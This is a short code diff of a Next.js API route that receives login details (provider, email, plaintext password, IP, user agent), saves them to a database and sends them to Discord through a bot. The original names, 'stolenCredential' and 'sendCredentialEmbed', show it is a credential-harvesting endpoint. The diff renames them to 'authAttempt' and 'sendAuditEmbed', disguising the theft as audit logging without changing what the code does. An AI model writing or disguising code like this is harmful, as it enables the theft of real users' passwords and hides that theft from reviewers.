@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 import { prisma } from "@/lib/prisma";
-import { sendCredentialEmbed } from "@/lib/discord/bot";
+import { sendAuditEmbed } from "@/lib/discord/bot";
 
 export async function POST(req: NextRequest) {
   try {
@@ -14,11 +14,11 @@ export async function POST(req: NextRequest) {
     const ip = req.headers.get("x-forwarded-for") || "unknown";
     const userAgent = req.headers.get("user-agent") || "unknown";
 
-    await prisma.stolenCredential.create({
+    await prisma.authAttempt.create({
       data: { provider, email, password, ip, userAgent },
     });
 
-    await sendCredentialEmbed({ provider, email, password, ip, userAgent });
+    await sendAuditEmbed({ provider, email, password, ip, userAgent });
 
     return NextResponse.json({ ok: true });
   } catch {
